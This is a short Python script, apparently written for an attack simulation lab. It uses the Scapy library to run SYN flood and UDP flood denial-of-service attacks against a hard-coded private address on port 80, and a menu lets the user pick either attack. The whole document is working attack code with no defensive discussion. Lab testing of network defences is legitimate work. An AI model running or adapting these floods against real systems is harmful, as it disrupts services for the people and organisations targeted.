# Attack simulation using Scapy
from scapy.all import *
import time

def syn_flood(target_ip, target_port, count=1000, interval=0.1):
    print(f"Starting SYN Flood attack on {target_ip}:{target_port}...")
    for _ in range(count):
        packet = IP(dst=target_ip)/TCP(dport=target_port, flags='S')
        send(packet, verbose=False)
        time.sleep(interval)
    print("Attack completed.")

def udp_flood(target_ip, target_port, count=1000, interval=0.1):
    print(f"Starting UDP Flood attack on {target_ip}:{target_port}...")
    for _ in range(count):
        packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X"*512)
        send(packet, verbose=False)
        time.sleep(interval)
    print("Attack completed.")

if __name__ == "__main__":
    target_ip = "10.0.0.5"  # Victim's IP
    target_port = 80  # Target port
    
    choice = input("Choose attack type (1: SYN Flood, 2: UDP Flood): ")
    if choice == "1":
        syn_flood(target_ip, target_port)
    elif choice == "2":
        udp_flood(target_ip, target_port)
    else:
        print("Invalid choice.")
